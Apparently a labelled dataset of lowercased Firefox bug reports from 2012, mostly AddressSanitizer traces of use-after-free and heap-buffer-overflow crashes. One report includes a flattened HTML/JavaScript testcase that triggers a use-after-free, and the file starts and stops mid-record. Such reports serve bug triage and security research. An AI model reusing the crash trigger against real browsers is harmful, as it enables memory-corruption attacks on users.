src/dom/base/nsglobalwindow.cpp:9851 24 in nsglobalwindow timercallback nsitimer void src/dom/base/nsglobalwindow.cpp:10119 shadow byte and word fd fd fd fd fd fd fd fd fd more shadow bytes 00 00 00 00 00 00 00 00 00 00 00 fb fb fb fb fb fa fa fa fa fa fa fa fa fa fa fa fa fa fa fa fa fd fd fd fd fd fd fd fd fd fd fd fd fd fd fd fd fa fa fa fa fa fa fa fa fa fa fa fa fa fa fa fa 00 00 00 00 fb fb fb fb stats 250m malloced 286m for red zones by 749048 calls stats 117m realloced by 28773 calls stats 218m freed by 507760 calls stats 83m really freed by 211442 calls stats 484m 123977 full pages mmaped in 121 calls mmaps by size class 8:557022 9:40955 10:16380 11:10235 12:3072 13:2048 14:768 15:256 16:576 17:224 18:288 19:208 20:4 mallocs by size class 8:677534 9:36702 10:14422 11:12268 12:3345 13:2207 14:878 15:297 16:587 17:251 18:343 19:210 20:4 frees by size class 8:455111 9:26721 10:10654 11:8924 12:2273 13:1923 14:605 15:266 16:519 17:241 18:316 19:205 20:2 rfrees by size class 8:174168 9:20742 10:7805 11:4812 12:1489 13:1110 14:416 15:139 16:471 17:142 18:142 19:4 20:2 stats malloc large 808 small slow 2574 1718 aborting	11
heap-use-after-free in domsvgtests getrequiredfeatures reproduces on trunk do n't have reliable testcase but this is hitting every now and then i got it once under a fully symbolized build that might give an idea of the problem as i get the reliable testcase i will attach it soon this hits in both domsvgtests getrequiredfeatures and domsvgtests getrequiredextensions 1718 error addresssanitizer heap-use-after-free on address at pc bp sp read of size 8 at thread t0 0 in nscyclecollectingautorefcnt incr void src dist/include/nsisupportsimpl.h:108 1 in mozilla domsvgstringlist addref src/content/svg/content/src/domsvgstringlist.cpp:21 2 in nsrefptr src dist/include/nsautoptr.h:898 3 in nsrefptr src dist/include/nsautoptr.h:899 4 in mozilla domsvgstringlist getdomwrapper mozilla svgstringlist nssvgelement bool unsigned char src/content/svg/content/src/domsvgstringlist.cpp:43 5 in domsvgtests getrequiredfeatures nsidomsvgstringlist src/content/svg/content/src/domsvgtests.cpp:33 6 in ns_invokebyindex_p src/xpcom/reflect/xptcall/src/md/unix/xptcinvoke_x86_64_unix.cpp:162 7 in callmethodhelper invoke src/js/xpconnect/src/xpcwrappednative.cpp:3105 8 in xpcwrappednative getattribute xpccallcontext src/js/xpconnect/src/xpcprivate.h:2817 9 in xpc_wn_gettersetter jscontext unsigned int js value src/js/xpconnect/src/xpcwrappednativejsops.cpp:1518 10 in js calljsnative jscontext int jscontext unsigned int js value js callargs const src/js/src/jscntxtinlines.h:372 11 in js invoke jscontext js invokeargsguard js maybeconstruct src/js/src/jsinterp.h:119 12 in js invoke jscontext js value const js value const unsigned int js value js value src/js/src/jsinterp.cpp:388 13 in js invokegetterorsetter jscontext jsobject js value const unsigned int js value js value src/js/src/jsinterp.cpp:461 14 in js shape get jscontext js handle jsobject jsobject jsobject js mutablehandle js value src/js/src/jsscopeinlines.h:296 15 in js_nativegetinline jscontext js handle jsobject jsobject jsobject js shape unsigned int js value src/js/src/jsobj.cpp:4461 16 in jsobject getgeneric jscontext js handle jsobject js handle jsobject js handle long js mutablehandle js value src/js/src/jsobjinlines.h:173 17 in jsobject getproperty jscontext js handle jsobject js handle jsobject js propertyname js mutablehandle js value src/js/src/jsobjinlines.h:184 18 in js getobjectelementoperation jscontext jsop js handle jsobject js value const js mutablehandle js value src/js/src/jsinterpinlines.h:713 19 in js runscript jscontext jsscript js stackframe src/js/src/jsinterp.cpp:301 20 in js executekernel jscontext js handle jsscript jsobject js value const js executetype js stackframe js value src/js/src/jsinterp.cpp:486 21 in js execute jscontext js handle jsscript jsobject js value src/js/src/jsinterp.cpp:523 22 in js evaluate jscontext js handle jsobject js compileoptions unsigned short const unsigned long js value src/js/src/jsapi.cpp:5673 23 in nsjscontext evaluatestring nsastring_internal const jsobject nsiprincipal nsiprincipal char const unsigned int jsversion nsastring_internal bool src/dom/base/nsjsenvironment.cpp:1499 24 in nsglobalwindow runtimeouthandler nstimeout nsiscriptcontext src/dom/base/nsglobalwindow.cpp:9590 25 in nsglobalwindow runtimeout nstimeout src/dom/base/nsglobalwindow.cpp:9851 26 in nsglobalwindow timercallback nsitimer void src/dom/base/nsglobalwindow.cpp:10118 27 in nstimerimpl fire src/xpcom/threads/nstimerimpl.cpp:473 28 in nstimerevent run src/xpcom/threads/nstimerimpl.cpp:556 29 in nsthread processnextevent bool bool src/xpcom/threads/nsthread.cpp:624 30 in ns_processnextevent_p nsithread bool src/objdir-ff-asan-sym/xpcom/build/nsthreadutils.cpp:220 31 in mozilla ipc messagepump run base messagepump delegate src/ipc/glue/messagepump.cpp:82 32 in messageloop runinternal src/ipc/chromium/src/base/message_loop.cc:208 33 in messageloop runhandler src/ipc/chromium/src/base/message_loop.cc:201 34 in messageloop run src/ipc/chromium/src/base/message_loop.cc:175 35 in nsbaseappshell run src/widget/xpwidgets/nsbaseappshell.cpp:163 36 in nsappstartup run src/toolkit/components/startup/nsappstartup.cpp:273 37 in xremain xre_mainrun src/toolkit/xre/nsapprunner.cpp:3835 38 in xremain xre_main int char nsxreappdata const src/toolkit/xre/nsapprunner.cpp:3912 39 in xre_main src/toolkit/xre/nsapprunner.cpp:3988 40 in do_main int char src/browser/app/nsbrowserapp.cpp:174 41 in main src/browser/app/nsbrowserapp.cpp:279 42 in 0 is located 8 bytes inside of 32-byte region freed by thread t0 here 0 in free 0 1 in moz_free src/memory/mozalloc/mozalloc.cpp:51 2 in operator delete void src dist/include/mozilla/mozalloc.h:224 3 in zl17dodeferredreleaseip11nsisupportsevr8nstarrayit_24nstarraydefaultallocatore src/js/xpconnect/src/xpcjsruntime.cpp:564 4 in xpcjsruntime gccallback jsruntime jsgcstatus src/js/xpconnect/src/xpcjsruntime.cpp:718 5 in collect jsruntime bool long js jsgcinvocationkind js gcreason reason src/js/src/jsgc.cpp:4505 6 in js gcfinalslice jsruntime js jsgcinvocationkind js gcreason reason src/js/src/jsgc.cpp:4544 7 in js finishincrementalgc jsruntime js gcreason reason src/js/src/jsfriendapi.cpp:177 8 in js_transplantobject src/js/src/jsapi.cpp:1570 9 in xpc transplantobject jscontext jsobject jsobject src/js/xpconnect/wrappers/wrapperfactory.cpp:674 10 in xpcwrappednative reparentwrapperiffound xpccallcontext xpcwrappednativescope xpcwrappednativescope jsobject nsisupports xpcwrappednative src/js/xpconnect/src/xpcwrappednative.cpp:1669 11 in nsxpconnect reparentwrappednativeiffound jscontext jsobject jsobject nsisupports nsixpconnectjsobjectholder src/js/xpconnect/src/nsxpconnect.cpp:1531 12 in nsnodeutils cloneandadopt nsinode bool bool nsnodeinfomanager jscontext jsobject nscomarray nsinode nsinode nsinode src/content/base/src/nsnodeutils.cpp:537 13 in nsnodeutils cloneandadopt nsinode bool bool nsnodeinfomanager jscontext jsobject nscomarray nsinode nsidomnode src dist/include/nsnodeutils.h:282 14 in nsnodeutils adopt nsinode nsnodeinfomanager jscontext jsobject nscomarray nsinode src/content/base/src/nsnodeutils.h:182 15 in nsdocument adoptnode nsidomnode nsidomnode src/content/base/src/nsdocument.cpp:6169 16 in nshtmldocument adoptnode nsidomnode nsidomnode src/content/html/document/src/nshtmldocument.h:87 17 in non-virtual thunk to nshtmldocument adoptnode nsidomnode nsidomnode src/gfx/cairo/cairo/src/cairo-surface-subsurface.c:0 18 in adoptnodeintoownerdoc nsinode nsinode src/content/base/src/nsinode.cpp:1257 19 in nsinode replaceorinsertbefore bool nsinode nsinode src/content/base/src/nsinode.cpp:1809 20 in nsinode replaceorinsertbefore bool nsinode nsinode unsigned int src dist/include/nsinode.h:1464 21 in nsinode insertbefore nsinode nsinode unsigned int src dist/include/nsinode.h:488 22 in nsinode appendchild nsinode unsigned int src dist/include/nsinode.h:498 23 in nsidomnode_appendchild jscontext unsigned int js value src/objdir-ff-asan-sym/js/xpconnect/src/dom_quickstubs.cpp:5531 24 in js calljsnative jscontext int jscontext unsigned int js value js callargs const src/js/src/jscntxtinlines.h:372 25 in js interpret jscontext js stackframe js interpmode src/js/src/jsinterp.cpp:2405 26 in js runscript jscontext jsscript js stackframe src/js/src/jsinterp.cpp:301 27 in js executekernel jscontext js handle jsscript jsobject js value const js executetype js stackframe js value src/js/src/jsinterp.cpp:486 28 in js execute jscontext js handle jsscript jsobject js value src/js/src/jsinterp.cpp:523 29 in js evaluate jscontext js handle jsobject js compileoptions unsigned short const unsigned long js value src/js/src/jsapi.cpp:5673 previously allocated by thread t0 here 0 in interceptor_malloc 0 1 in moz_xmalloc src/memory/mozalloc/mozalloc.cpp:57 2 in operator new unsigned long src dist/include/mozilla/mozalloc.h:200 3 in domsvgtests getrequiredfeatures nsidomsvgstringlist src/content/svg/content/src/domsvgtests.cpp:33 4 in ns_invokebyindex_p src/xpcom/reflect/xptcall/src/md/unix/xptcinvoke_x86_64_unix.cpp:162 5 in callmethodhelper invoke src/js/xpconnect/src/xpcwrappednative.cpp:3105 6 in xpcwrappednative getattribute xpccallcontext src/js/xpconnect/src/xpcprivate.h:2817 7 in xpc_wn_gettersetter jscontext unsigned int js value src/js/xpconnect/src/xpcwrappednativejsops.cpp:1518 8 in js calljsnative jscontext int jscontext unsigned int js value js callargs const src/js/src/jscntxtinlines.h:372 9 in js invoke jscontext js invokeargsguard js maybeconstruct src/js/src/jsinterp.h:119 10 in js invoke jscontext js value const js value const unsigned int js value js value src/js/src/jsinterp.cpp:388 11 in js invokegetterorsetter jscontext jsobject js value const unsigned int js value js value src/js/src/jsinterp.cpp:461 12 in js shape get jscontext js handle jsobject jsobject jsobject js mutablehandle js value src/js/src/jsscopeinlines.h:296 13 in js_nativegetinline jscontext js handle jsobject jsobject jsobject js shape unsigned int js value src/js/src/jsobj.cpp:4461 14 in jsobject getgeneric jscontext js handle jsobject js handle jsobject js handle long js mutablehandle js value src/js/src/jsobjinlines.h:173 15 in jsobject getproperty jscontext js handle jsobject js handle jsobject js propertyname js mutablehandle js value src/js/src/jsobjinlines.h:184 16 in js getobjectelementoperation jscontext jsop js handle jsobject js value const js mutablehandle js value src/js/src/jsinterpinlines.h:713 17 in js runscript jscontext jsscript js stackframe src/js/src/jsinterp.cpp:301 18 in js executekernel jscontext js handle jsscript jsobject js value const js executetype js stackframe js value src/js/src/jsinterp.cpp:486 19 in js execute jscontext js handle jsscript jsobject js value src/js/src/jsinterp.cpp:523 20 in js evaluate jscontext js handle jsobject js compileoptions unsigned short const unsigned long js value src/js/src/jsapi.cpp:5673 21 in nsjscontext evaluatestring nsastring_internal const jsobject nsiprincipal nsiprincipal char const unsigned int jsversion nsastring_internal bool src/dom/base/nsjsenvironment.cpp:1499 22 in nsglobalwindow runtimeouthandler nstimeout nsiscriptcontext src/dom/base/nsglobalwindow.cpp:9590 23 in nsglobalwindow runtimeout nstimeout src/dom/base/nsglobalwindow.cpp:9851 24 in nsglobalwindow timercallback nsitimer void src/dom/base/nsglobalwindow.cpp:10119 shadow byte and word fd fd fd fd fd fd fd fd fd more shadow bytes 00 00 00 00 00 00 00 00 00 00 00 fb fb fb fb fb fa fa fa fa fa fa fa fa fa fa fa fa fa fa fa fa fd fd fd fd fd fd fd fd fd fd fd fd fd fd fd fd fa fa fa fa fa fa fa fa fa fa fa fa fa fa fa fa 00 00 00 00 fb fb fb fb stats 250m malloced 286m for red zones by 749048 calls stats 117m realloced by 28773 calls stats 218m freed by 507760 calls stats 83m really freed by 211442 calls stats 484m 123977 full pages mmaped in 121 calls mmaps by size class 8:557022 9:40955 10:16380 11:10235 12:3072 13:2048 14:768 15:256 16:576 17:224 18:288 19:208 20:4 mallocs by size class 8:677534 9:36702 10:14422 11:12268 12:3345 13:2207 14:878 15:297 16:587 17:251 18:343 19:210 20:4 frees by size class 8:455111 9:26721 10:10654 11:8924 12:2273 13:1923 14:605 15:266 16:519 17:241 18:316 19:205 20:2 rfrees by size class 8:174168 9:20742 10:7805 11:4812 12:1489 13:1110 14:416 15:139 16:471 17:142 18:142 19:4 20:2 stats malloc large 808 small slow 2574 1718 aborting	11
crash with assertion inspos too small reproducible with built from choller/firefox/asan/20120831-mozilla-central-linux64-debug-fcc533f691e9+asan.html os ubuntu 12.04 x86_64 the reprofile is not stable and it might take few tries to reproduce asan-report asan sigsegv 11689 error addresssanitizer crashed on unknown address pc sp bp t0 addresssanitizer can not provide additional info aborting 0 in build/buildd/eglibc-2.15/string sysdeps/x86_64/multiarch/memcpy-ssse3-back.s:2577 1 in nstarray_base nstarraydefaultallocator shiftdata unsigned int unsigned int unsigned int unsigned int unsigned long builds/slave/try-lnx64-dbg/build dist/include/nstarray-inl.h:247 2 in nsrefptr nshtmloptionelement nstarray nsrefptr nshtmloptionelement nstarraydefaultallocator replaceelementsat nshtmloptionelement unsigned int unsigned int nshtmloptionelement const unsigned int builds/slave/try-lnx64-dbg/build dist/include/nstarray.h:724 3 in nshtmloptioncollection insertoptionat nshtmloptionelement unsigned int builds/slave/try-lnx64-dbg/build/content/html/content/src/nshtmlselectelement.h:68 4 in nshtmlselectelement insertoptionsintolistrecurse nsicontent int int builds/slave/try-lnx64-dbg/build/content/html/content/src/nshtmlselectelement.cpp:338 5 in nshtmlselectelement insertoptionsintolist nsicontent int int bool builds/slave/try-lnx64-dbg/build/content/html/content/src/nshtmlselectelement.cpp:215 6 in nshtmlselectelement willaddoptions nsicontent nsicontent int bool builds/slave/try-lnx64-dbg/build/content/html/content/src/nshtmlselectelement.cpp:455 7 in nssafeoptionlistmutation builds/slave/try-lnx64-dbg/build/content/html/content/src/nshtmlselectelement.cpp:73 8 in nshtmlselectelement insertchildat nsicontent unsigned int bool builds/slave/try-lnx64-dbg/build/content/html/content/src/nshtmlselectelement.cpp:191	11
use-after-free in nsicontent getnamespaceid when i load html head style c0 content a style script onload function document.body.appendchild document.createelement td el0=document.createelement div document.body.appendchild el0 el1=document.createelement form document.body.appendchild el1 el2=document.createelement input el2.setattribute type submit el1.appendchild el2 el3=document.createelement input el3.setattribute required a el1.appendchild el3 el4=document.createelement input el4.type='file el1.appendchild el4 settimeout function el4.focus settimeout function el4.click el2.setattribute required a el0.setattribute class c0 settimeout function document.designmode='on document.execcommand italic document.designmode='off settimeout function el2.click 100 100 100 100 script head body body html i get a crash like so 24180 error addresssanitizer heap-use-after-free on address at pc bp sp read of size 8 at thread t0 0 in nsicontent getnamespaceid const builds/slave/try-lnx64/build dist/include/nsinodeinfo.h:143 1 in nscomptr nsidomeventtarget operator nscomptr nsidomeventtarget const builds/slave/try-lnx64/build dist/include/nscomptr.h:614 2 in nsxulpopupmanager showpopupcallback nsicontent nsmenupopupframe bool bool builds/slave/try-lnx64/build/layout/xul/base/src/nsxulpopupmanager.cpp:716 3 in nsxulpopupmanager firepopupshowingevent nsicontent bool bool builds/slave/try-lnx64/build/layout/xul/base/src/nsxulpopupmanager.cpp:1181 4 in nsxulpopupmanager showpopup nsicontent nsicontent nsastring_internal const int int bool bool bool nsidomevent builds/slave/try-lnx64/build/layout/xul/base/src/nsxulpopupmanager.cpp:568 5 in non-virtual thunk to nspopupboxobject openpopup nsidomelement nsastring_internal const int int bool bool nsidomevent builds/slave/try-lnx64/build dist/include/nscomptr.h:407 is located 24 bytes inside of 368-byte region freed by thread t0 here 0 in free 0 1 in nsnodeutils lastrelease nsinode builds/slave/try-lnx64/build/content/base/src/nsnodeutils.cpp:261 2 in mozilla dom fragmentorelement release builds/slave/try-lnx64/build/content/base/src/fragmentorelement.cpp:1853 3 in nsglobalwindow setfocusednode nsicontent unsigned int bool builds/slave/try-lnx64/build/dom/base/nsglobalwindow.cpp:7765 4 in nsfocusmanager setfocusinner nsicontent int bool bool aurora and nightly affected atleast	11
heap-buffer-overflow in convolve3x3 reproducible with asan-build from choller/firefox/asan/20120831-mozilla-central-linux64-debug-fcc533f691e9+asan.html asan-report 1095 error addresssanitizer heap-buffer-overflow on address at pc bp sp read of size 1 at thread t0 0 in convolve3x3 home/attekett/firefox/src/content/svg/content/src/nssvgfilters.cpp:4926 is located 3 bytes to the right of 4000-byte region allocated by thread t0 here 0 in posix_memalign 0 1 in tryallocalignedbytes home/attekett/firefox/src/gfx/thebes/gfximagesurface.cpp:89 2 in nssvgfe setupscalingfilter nssvgfilterinstance nssvgfe image const nssvgfe image const nsintrect const nssvgnumberpair home/attekett/firefox/src/content/svg/content/src/nssvgfilters.cpp:153 3 in nssvgfelightingelement filter nssvgfilterinstance nstarray nssvgfe image const nstarraydefaultallocator const nssvgfe image const nsintrect const home/attekett/firefox/src/content/svg/content/src/nssvgfilters.cpp:5009 4 in nssvgfilterinstance render gfxasurface home/attekett/firefox/src/layout/svg/base/src/nssvgfilterinstance.cpp:583 5 in nssvgfilterframe paintfilteredframe nsrenderingcontext nsiframe nssvgfilterpaintcallback nsrect const home/attekett/firefox/src/layout/svg/base/src/nssvgfilterframe.cpp:444	11
heap-use-after-free in mozilla trackunionstream endtrack reproduces on trunk mediastreamgraphimpl finishstream mediastreamgraphimpl finishstream nsbuiltindecoderstatemachine runstatemachine queuing nsbuiltindecoder playbackended 26602 error addresssanitizer heap-use-after-free on address at pc bp sp read of size 1 at thread t14 0 in mozilla streambuffer track isended const src/content/media/streambuffer.h:125 1 in mozilla trackunionstream endtrack unsigned int src/content/media/trackunionstream.h:148 2 in mozilla trackunionstream produceoutput long long src/content/media/trackunionstream.h:83 3 in mozilla mediastreamgraphimpl runthread src/content/media/mediastreamgraph.cpp:1395 4 in mozilla anonymous namespace mediastreamgraphthreadrunnable run src/content/media/mediastreamgraph.cpp:1510 5 in nsthread processnextevent bool bool src/xpcom/threads/nsthread.cpp:624 6 in ns_processnextevent_p nsithread bool src/objdir-ff-asan-sym/xpcom/build/nsthreadutils.cpp:220 7 in nsthread threadfunc void src/xpcom/threads/nsthread.cpp:257 8 in pt_root src/nsprpub/pr/src/pthreads/ptthread.c:156 9 in asan asanthread threadstart 0 is located 24 bytes inside of 32-byte region freed by thread t14 here 0 in free 0 1 in moz_free src/memory/mozalloc/mozalloc.cpp:51 2 in operator delete void src dist/include/mozilla/mozalloc.h:224 3 in nsautoptr src dist/include/nsautoptr.h:70 4 in nstarrayelementtraits nsautoptr mozilla streambuffer track destruct nsautoptr mozilla streambuffer track src dist/include/nstarray.h:348 5 in nstarray nsautoptr mozilla streambuffer track nstarraydefaultallocator destructrange unsigned int unsigned int src dist/include/nstarray.h:1213 6 in nstarray nsautoptr mozilla streambuffer track nstarraydefaultallocator removeelementsat unsigned int unsigned int src dist/include/nstarray.h:933 7 in nstarray nsautoptr mozilla streambuffer track nstarraydefaultallocator removeelementat unsigned int src dist/include/nstarray.h:939 8 in mozilla streambuffer forgetupto long src/content/media/streambuffer.cpp:51 9 in mozilla mediastream advancetimevaryingvaluestocurrenttime long long src/content/media/mediastreamgraph.h:385 10 in mozilla mediastreamgraphimpl updatecurrenttime src/content/media/mediastreamgraph.cpp:816 11 in mozilla mediastreamgraphimpl runthread src/content/media/mediastreamgraph.cpp:1352 12 in mozilla anonymous namespace mediastreamgraphthreadrunnable run src/content/media/mediastreamgraph.cpp:1510 13 in nsthread processnextevent bool bool src/xpcom/threads/nsthread.cpp:624 14 in ns_processnextevent_p nsithread bool src/objdir-ff-asan-sym/xpcom/build/nsthreadutils.cpp:220 15 in nsthread threadfunc void src/xpcom/threads/nsthread.cpp:257 16 in pt_root src/nsprpub/pr/src/pthreads/ptthread.c:156 17 in asan asanthread threadstart 0 previously allocated by thread t14 here 0 in interceptor_malloc 0 1 in moz_xmalloc src/memory/mozalloc/mozalloc.cpp:57 2 in operator new unsigned long src dist/include/mozilla/mozalloc.h:200 3 in mozilla trackunionstream addtrack mozilla mediainputport mozilla streambuffer track long src/content/media/trackunionstream.h:133 4 in mozilla trackunionstream produceoutput long long src/content/media/trackunionstream.h:74 5 in mozilla mediastreamgraphimpl runthread src/content/media/mediastreamgraph.cpp:1395 6 in mozilla anonymous namespace mediastreamgraphthreadrunnable run src/content/media/mediastreamgraph.cpp:1510 7 in nsthread processnextevent bool bool src/xpcom/threads/nsthread.cpp:624 8 in ns_processnextevent_p nsithread bool src/objdir-ff-asan-sym/xpcom/build/nsthreadutils.cpp:220 9 in nsthread threadfunc void src/xpcom/threads/nsthread.cpp:257 10 in pt_root src/nsprpub/pr/src/pthreads/ptthread.c:156 11 in asan asanthread threadstart 0 thread t14 created by t0 here 0 in pthread_create 0 1 in pr_createthread src/nsprpub/pr/src/pthreads/ptthread.c:393 2 in pr_createthread src/nsprpub/pr/src/pthreads/ptthread.c:476 3 in nsthread init src/xpcom/threads/nsthread.cpp:323 4 in nsthreadmanager newthread unsigned int unsigned int nsithread src/xpcom/threads/nsthreadmanager.cpp:215 5 in ns_newthread_p nsithread nsirunnable unsigned int src/objdir-ff-asan-sym/xpcom/build/nsthreadutils.cpp:49 6 in mozilla mediastreamgraphimpl runinstablestate src/content/media/mediastreamgraph.cpp:1617 7 in mozilla anonymous namespace mediastreamgraphstablestaterunnable run src/content/media/mediastreamgraph.cpp:1544 8 in nsbaseappshell runsyncsectionsinternal bool unsigned int src/widget/xpwidgets/nsbaseappshell.cpp:352 9 in nsbaseappshell runsyncsections bool unsigned int src/widget/xpwidgets/nsbaseappshell.h:89 10 in nsbaseappshell afterprocessnextevent nsithreadinternal unsigned int src/widget/xpwidgets/nsbaseappshell.cpp:408 11 in non-virtual thunk to nsbaseappshell afterprocessnextevent nsithreadinternal unsigned int src/gfx/cairo/cairo/src/cairo-surface-subsurface.c:0 12 in nsthread processnextevent bool bool src/xpcom/threads/nsthread.cpp:637 13 in ns_processnextevent_p nsithread bool src/objdir-ff-asan-sym/xpcom/build/nsthreadutils.cpp:220 14 in mozilla ipc messagepump run base messagepump delegate src/ipc/glue/messagepump.cpp:82 15 in messageloop runinternal src/ipc/chromium/src/base/message_loop.cc:208 16 in messageloop runhandler src/ipc/chromium/src/base/message_loop.cc:201 17 in messageloop run src/ipc/chromium/src/base/message_loop.cc:175 18 in nsbaseappshell run src/widget/xpwidgets/nsbaseappshell.cpp:163 19 in nsappstartup run src/toolkit/components/startup/nsappstartup.cpp:273 20 in xremain xre_mainrun src/toolkit/xre/nsapprunner.cpp:3835 21 in xremain xre_main int char nsxreappdata const src/toolkit/xre/nsapprunner.cpp:3912 22 in xre_main src/toolkit/xre/nsapprunner.cpp:3988 23 in do_main int char src/browser/app/nsbrowserapp.cpp:174 24 in main src/browser/app/nsbrowserapp.cpp:279 25 in 0 shadow byte and word fd fd fd fd fd fd fd fd fd more shadow bytes 00 00 02 fb fb fb fb fb fb fb fb fb fb fb fb fb fa fa fa fa fa fa fa fa fa fa fa fa fa fa fa fa fd fd fd fd fd fd fd fd fd fd fd fd fd fd fd fd fa fa fa fa fa fa fa fa fa fa fa fa fa fa fa fa fd fd fd fd fd fd fd fd stats 282m malloced 279m for red zones by 392075 calls stats 43m realloced by 22062 calls stats 239m freed by 253504 calls stats 98m really freed by 176236 calls stats 488m 125019 full pages mmaped in 122 calls mmaps by size class 8:245745 9:40955 10:16380 11:14329 12:3072 13:1536 14:1280 15:256 16:448 17:1248 18:144 19:152 20:16 mallocs by size class 8:296665 9:50967 10:17702 11:17532 12:2750 13:1931 14:1873 15:343 16:557 17:1418 18:169 19:151 20:17 frees by size class 8:177303 9:40842 10:13985 11:14149 12:1762 13:1413 14:1646 15:291 16:497 17:1398 18:57 19:147 20:14 rfrees by size class 8:130433 9:23363 10:9030 11:9935 12:870 13:705 14:725 15:168 16:347 17:626 18:28 19:5 20:1 stats malloc large 1755 small slow 2053 26602 aborting	11
heap-use-after-free in nstexteditrules willinsert reproduces on trunk testcase coming 8725 error addresssanitizer heap-use-after-free on address at pc bp sp read of size 8 at thread t0 0 in nscomptr_base assign_assuming_addref nsisupports src dist/include/nscomptr.h:435 1 in nscomptr_base assign_with_addref nsisupports src/objdir-ff-asan-sym/xpcom/build/nscomptr.cpp:49 2 in nscomptr nsidomnode operator nsidomnode src dist/include/nscomptr.h:622 3 in nstexteditrules willinsert nsiselection bool src/editor/libeditor/text/nstexteditrules.cpp:327 4 in nshtmleditrules willinsert nsiselection bool src/editor/libeditor/html/nshtmleditrules.cpp:1187 5 in nshtmleditrules willdoaction mozilla selection nsrulesinfo bool bool src/editor/libeditor/html/nshtmleditrules.cpp:618 6 in nshtmleditor doinserthtmlwithcontext nsastring_internal const nsastring_internal const nsastring_internal const nsastring_internal const nsidomdocument nsidomnode int bool bool src/editor/libeditor/html/nshtmldatatransfer.cpp:391 7 in nshtmleditor inserthtmlwithcontext nsastring_internal const nsastring_internal const nsastring_internal const nsastring_internal const nsidomdocument nsidomnode int bool src/editor/libeditor/html/nshtmldatatransfer.cpp:229 8 in nshtmleditor inserthtml nsastring_internal const src/editor/libeditor/html/nshtmldatatransfer.cpp:214 9 in non-virtual thunk to nshtmleditor inserthtml nsastring_internal const src/gfx/cairo/cairo/src/cairo-surface-subsurface.c:0 10 in nsinserthtmlcommand docommandparams char const nsicommandparams nsisupports src/editor/composer/src/nscomposercommands.cpp:1335 11 in nscontrollercommandtable docommandparams char const nsicommandparams nsisupports src/embedding/components/commandhandler/src/nscontrollercommandtable.cpp:175 12 in nsbasecommandcontroller docommandwithparams char const nsicommandparams src/embedding/components/commandhandler/src/nsbasecommandcontroller.cpp:153 13 in non-virtual thunk to nsbasecommandcontroller docommandwithparams char const nsicommandparams src/gfx/cairo/cairo/src/cairo-surface-subsurface.c:0 14 in nscommandmanager docommand char const nsicommandparams nsidomwindow src/embedding/components/commandhandler/src/nscommandmanager.cpp:234 15 in nshtmldocument execcommand nsastring_internal const bool nsastring_internal const bool src/content/html/document/src/nshtmldocument.cpp:3232 16 in non-virtual thunk to nshtmldocument execcommand nsastring_internal const bool nsastring_internal const bool src/gfx/cairo/cairo/src/cairo-surface-subsurface.c:0 17 in ns_invokebyindex_p src/xpcom/reflect/xptcall/src/md/unix/xptcinvoke_x86_64_unix.cpp:162 18 in callmethodhelper invoke src/js/xpconnect/src/xpcwrappednative.cpp:3105 19 in xpc_wn_callmethod jscontext unsigned int js value src/js/xpconnect/src/xpcwrappednativejsops.cpp:1470 20 in js calljsnative jscontext int jscontext unsigned int js value js callargs const src/js/src/jscntxtinlines.h:372 21 in js interpret jscontext js stackframe js interpmode src/js/src/jsinterp.cpp:2405 22 in js runscript jscontext jsscript js stackframe src/js/src/jsinterp.cpp:301 23 in js executekernel jscontext js handle jsscript jsobject js value const js executetype js stackframe js value src/js/src/jsinterp.cpp:486 24 in js execute jscontext js handle jsscript jsobject js value src/js/src/jsinterp.cpp:523 25 in js evaluate jscontext js handle jsobject js compileoptions unsigned short const unsigned long js value src/js/src/jsapi.cpp:5702 26 in nsjscontext evaluatestring nsastring_internal const jsobject nsiprincipal nsiprincipal char const unsigned int jsversion nsastring_internal bool src/dom/base/nsjsenvironment.cpp:1499 27 in nsglobalwindow runtimeouthandler nstimeout nsiscriptcontext src/dom/base/nsglobalwindow.cpp:9590 28 in nsglobalwindow runtimeout nstimeout src/dom/base/nsglobalwindow.cpp:9851 29 in nsglobalwindow timercallback nsitimer void src/dom/base/nsglobalwindow.cpp:10118 30 in nstimerimpl fire src/xpcom/threads/nstimerimpl.cpp:473 31 in nstimerevent run src/xpcom/threads/nstimerimpl.cpp:556 32 in nsthread processnextevent bool bool src/xpcom/threads/nsthread.cpp:624 33 in ns_processnextevent_p nsithread bool src/objdir-ff-asan-sym/xpcom/build/nsthreadutils.cpp:220 34 in mozilla ipc messagepump run base messagepump delegate src/ipc/glue/messagepump.cpp:82 35 in messageloop runinternal src/ipc/chromium/src/base/message_loop.cc:208 36 in messageloop runhandler src/ipc/chromium/src/base/message_loop.cc:201 37 in messageloop run src/ipc/chromium/src/base/message_loop.cc:175 38 in nsbaseappshell run src/widget/xpwidgets/nsbaseappshell.cpp:163 39 in nsappstartup run src/toolkit/components/startup/nsappstartup.cpp:273 40 in xremain xre_mainrun src/toolkit/xre/nsapprunner.cpp:3835 41 in xremain xre_main int char nsxreappdata const src/toolkit/xre/nsapprunner.cpp:3912 42 in xre_main src/toolkit/xre/nsapprunner.cpp:3988 43 in do_main int char src/browser/app/nsbrowserapp.cpp:174 44 in main src/browser/app/nsbrowserapp.cpp:279 45 in 0 is located 72 bytes inside of 1096-byte region freed by thread t0 here 0 in free 0 1 in moz_free src/memory/mozalloc/mozalloc.cpp:51 2 in operator delete void src dist/include/mozilla/mozalloc.h:224 3 in nstexteditrules release src/editor/libeditor/text/nstexteditrules.cpp:93 4 in nshtmleditrules release src/editor/libeditor/html/nshtmleditrules.cpp:220 5 in nscomptr_base assign_assuming_addref nsisupports src dist/include/nscomptr.h:440 6 in nscomptr_base assign_with_addref nsisupports src/objdir-ff-asan-sym/xpcom/build/nscomptr.cpp:49 7 in nscomptr nsieditrules operator nsieditrules src dist/include/nscomptr.h:622 8 in nshtmleditor initrules src/editor/libeditor/html/nshtmleditor.cpp:488 9 in nsplaintexteditor endeditorinit src/editor/libeditor/text/nsplaintexteditor.cpp:200 10 in nsautoeditinitrulestrigger src/editor/libeditor/text/nstexteditutils.cpp:94 11 in nshtmleditor init nsidomdocument nsicontent nsiselectioncontroller unsigned int src/editor/libeditor/html/nshtmleditor.cpp:289 12 in nseditingsession setupeditoronwindow nsidomwindow src/editor/composer/src/nseditingsession.cpp:460 13 in nseditingsession makewindoweditable nsidomwindow char const bool bool bool src/editor/composer/src/nseditingsession.cpp:173 14 in nshtmldocument editingstatechanged src/content/html/document/src/nshtmldocument.cpp:2693 15 in nshtmldocument beginload src/content/html/document/src/nshtmldocument.cpp:880 16 in nshtml5treeopexecutor willbuildmodel nsdtdmode src/parser/html/nshtml5treeopexecutor.cpp:116 17 in nshtml5parser parse nsastring_internal const void nsacstring_internal const bool nsdtdmode src/parser/html/nshtml5parser.cpp:231 18 in 